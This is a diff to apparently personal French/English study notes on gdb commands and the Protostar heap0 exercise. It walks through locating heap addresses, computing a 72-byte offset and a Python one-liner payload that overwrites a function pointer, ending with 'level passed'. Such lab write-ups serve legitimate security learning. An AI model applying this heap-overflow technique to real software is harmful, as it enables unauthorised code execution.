@@ -25,6 +25,10 @@ Set a breakpoint at the start of `main`:
 
 	b[reak] main
 
+List all breakpoints:
+
+	i[nfo] b
+
 Set a breakpoint to a given address:
 
 	b[reak] *0x123456789
@@ -64,6 +68,90 @@ Get out of a function:
 Print a value:
 
 	print main
+
+	print nowinner
+	$4 = {void (void)} 0x8048478 <nowinner>
+
+Afficher le contenu d'une zone mémoire:
+
+	x/1000x <@ de début de la zone>
+
+# Utilisation de la pile
+
+### Description rapide
+
+Code C:
+
+	printf("data is at %p, fp is at %p\n", d, f);
+
+Assembleur:
+
+	0x080484c0 <main+52>:	mov    eax,0x80485f7
+	0x080484c5 <main+57>:	mov    edx,DWORD PTR [esp+0x1c]
+	0x080484c9 <main+61>:	mov    DWORD PTR [esp+0x8],edx
+	0x080484cd <main+65>:	mov    edx,DWORD PTR [esp+0x18]
+	0x080484d1 <main+69>:	mov    DWORD PTR [esp+0x4],edx
+	0x080484d5 <main+73>:	mov    DWORD PTR [esp],eax
+	0x080484d8 <main+76>:	call   0x8048378 <printf@plt>
+
+Donc, à l'instant de l'exécution de `printf`, la pile est:
+
+	esp:     "data is at %p, fp is at %p\n"
+	esp+0x4: d
+	esp+0x8: f
+
+### Vérification
+
+A l'exécution, on a:
+
+	user@protostar:/opt/protostar/bin$ ./heap0 toto
+	data is at 0x804a008, fp is at 0x804a050
+	level has not been passed
+
+Donc:
+
+* @param1 (`"data is at %p, fp is at %p\n"`)
+* @param2 (`d`): `0x804a008`
+* @param3 (`f`): `0x804a050`
+
+Il faut savoir que:
+
+	MOV opérandecible,opérandesource
+
+On voit que:
+
+	(gdb) x/s 0x80485f7
+	0x80485f7:	 "data is at %p, fp is at %p\n"
+
+Donc, à l'instant de l'exécution de `printf`, la pile est:
+
+	esp:     "data is at %p, fp is at %p\n"
+	esp+0x4: d
+	esp+0x8: f
+
+Pour voir le contenu de la pile au moment de l'exécution de la fonction `printf`, il faut placer un point d'arret à l'adresse qui précède l'appel à la fonction:
+
+	(gdb) b *0x080484d5
+	Breakpoint 1 at 0x80484d5: file heap0/heap0.c, line 34.
+	(gdb) r AAAA
+	...
+	(gdb) si
+	0x080484d8	34	in heap0/heap0.c
+	(gdb) x/x $esp
+	0xbffff770:	0x080485f7
+
+`0x080485f7` est bien l'adresse du premier paramètre de la fonction `printf`.
+
+	(gdb) x/x $esp + 0x4
+	0xbffff774:	0x0804a008
+	(gdb) x/x $esp + 0x8
+	0xbffff778:	0x0804a050
+
+On a bien:
+
+* `$esp = "data is at %p, fp is at %p\n"`
+* `$esp + 0x4 = d`
+* `$esp + 0x8 = f`
 
 # Stack5
 
@@ -654,11 +742,104 @@ Voir une correction sur un lien intéressant... (section "Good links").
 * [Lien](http://exploit-exercises.com/protostar/heap0)
 * [Explication](https://www.ayrx.me/protostar-walkthrough-heap)
 
+On exécute le programme avec un argument: "`AAAA`".
 
+	run AAAA
 
+Utiliser `info proc map[pings]` pour voir où le "heap" commence et termine => `0x804a000` => `0x806b000`.
 
+On cherche la valeur spécifiée en premier paramètre du programme au moment de son exécution (`argv[1]`).
 
+	x/100s 0x804a000
+	...
+	0x804a006:	 ""
+	0x804a007:	 ""
+	0x804a008:	 "AAAA"
+	0x804a00d:	 ""
+	0x804a00e:	 ""
 
+Résultat: on constate que le paramètre "`AAAA`" est stocké dans le "heap" à l'adresse `0x804a008`.
+
+Concentrons nous sur la ligne suivante:
+
+	f->fp = nowinner;
+
+`f` est retourné par `malloc`. Donc `f` est stocké dans le "heap".
+Et donc, `f->fp` se trouve dans le "heap". Par conséquent, l'adresse de `nowinner` est
+stockée dans le "heap" (à l'adresse de `f->fp`).
+
+	print nowinner
+	$4 = {void (void)} 0x8048478 <nowinner>
+
+Conclusion: `f->fp = 0x8048478`
+
+La technique consiste à écraser la valeur pointée par `f->fp` (l'adresse de `nowinner`) par l'adresse de `winner`.
+
+	0x080484c0 <main+52>:	mov    eax,0x80485f7
+	0x080484c5 <main+57>:	mov    edx,DWORD PTR [esp+0x1c]
+	0x080484c9 <main+61>:	mov    DWORD PTR [esp+0x8],edx
+	0x080484cd <main+65>:	mov    edx,DWORD PTR [esp+0x18]
+	0x080484d1 <main+69>:	mov    DWORD PTR [esp+0x4],edx
+	0x080484d5 <main+73>:	mov    DWORD PTR [esp],eax
+	0x080484d8 <main+76>:	call   0x8048378 <printf@plt>
+
+Et:
+
+	(gdb) x/s 0x80485f7
+	0x80485f7:	 "data is at %p, fp is at %p\n"
+
+Au moment de l'exécution de `printf`, la structure de la pile est:
+
+	esp:     "data is at %p, fp is at %p\n" [=> 0x80485f7]
+	esp+0x4: d                              [=> 0x804a008]
+	esp+0x8: f                              [=> 0x804a050]
+
+> CF section "Utilisation de la pile".
+
+Donc:
+* l'adresse de `d`, dans le "heap" est `0x804a008`.
+* l'adresse de `f`, dans le "heap" est `0x804a050`.
+
+Donc, il faut écrire plus de 72 caractères:
+
+	(gdb) print/x 0x804a050 - 0x804a008
+	$1 = 0x48
+	(gdb) print/d 0x804a050 - 0x804a008
+	$2 = 72
+
+Adresse de `winner`:
+
+	(gdb) print winner
+	$5 = {void (void)} 0x8048464 <winner>
+
+Test:
+
+	python -c 'print("A" * 72 + "\x64\x84\x04\x08")' | ./heap0
+	r `python -c 'print("A" * 72 + "\x64\x84\x04\x08")'`
+
+Du coup:
+
+	(gdb) b *0x080484fb
+	Breakpoint 1 at 0x80484fb: file heap0/heap0.c, line 38.
+	(gdb) r `python -c 'print("A" * 72 + "\x64\x84\x04\x08")'`
+	Starting program: /opt/protostar/bin/heap0 `python -c 'print("A" * 72 + "\x64\x84\x04\x08")'`
+	data is at 0x804a008, fp is at 0x804a050
+
+	Breakpoint 1, 0x080484fb in main (argc=2, argv=0xbffff804) at heap0/heap0.c:38
+	38	heap0/heap0.c: No such file or directory.
+		in heap0/heap0.c
+	(gdb) si
+	0x080484fd	38	in heap0/heap0.c
+	(gdb) x/x $eax
+	<winner>:	0x83e58955
+
+Du coup:
+
+	user@protostar:/opt/protostar/bin$  ./heap0 `python -c 'print("A" * 72 + "\x64\x84\x04\x08")'`
+	data is at 0x804a008, fp is at 0x804a050
+	level passed
+
+# Heap 1
 
 
 
